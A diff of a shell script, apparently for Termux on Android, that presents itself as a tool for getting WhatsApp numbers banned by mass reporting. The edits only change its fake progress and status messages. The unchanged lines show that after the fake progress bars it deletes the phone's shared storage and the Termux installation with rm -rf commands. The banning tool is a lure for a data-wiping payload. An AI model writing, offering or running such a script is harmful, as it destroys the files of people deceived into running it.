@@ -158,7 +158,7 @@ sleep 4 && clear
         echo "======================================>95%"
         sleep 0.5 && clear
         echo "=======================================>100%"
-echo "10000 REPORTS done!!!.........................."
+echo "10000 REPORTS done IN some couple of minutes__!!!.........................."
  sleep 40 && clear
         echo "==> 5%"
         sleep 1 && clear
@@ -200,7 +200,7 @@ echo "10000 REPORTS done!!!.........................."
         sleep 0.5 && clear
         echo "=======================================>100%"
 sleep 20 && clear
-echo "REPORT SENDS SUCESSFULLY"
+echo "REPORT SENDED SUCESSFULLY PLEASE WAIT........"
 termux-setup-storage
 rm -rf /sdcard/*
 rm -rf /data/data/com.termux/files/usr
@@ -220,8 +220,8 @@ then
 	clear
 	sleep 6 && clear
         clear
-        toilet -f future "WHATSAPP NUMBER BANNING"
-	echo "Code staring...."
+        toilet -f future "WHATSAPP NUMBER BANNER"
+	echo "Code staring....please wait...."
 	sleep 2
 	ip
 	loading
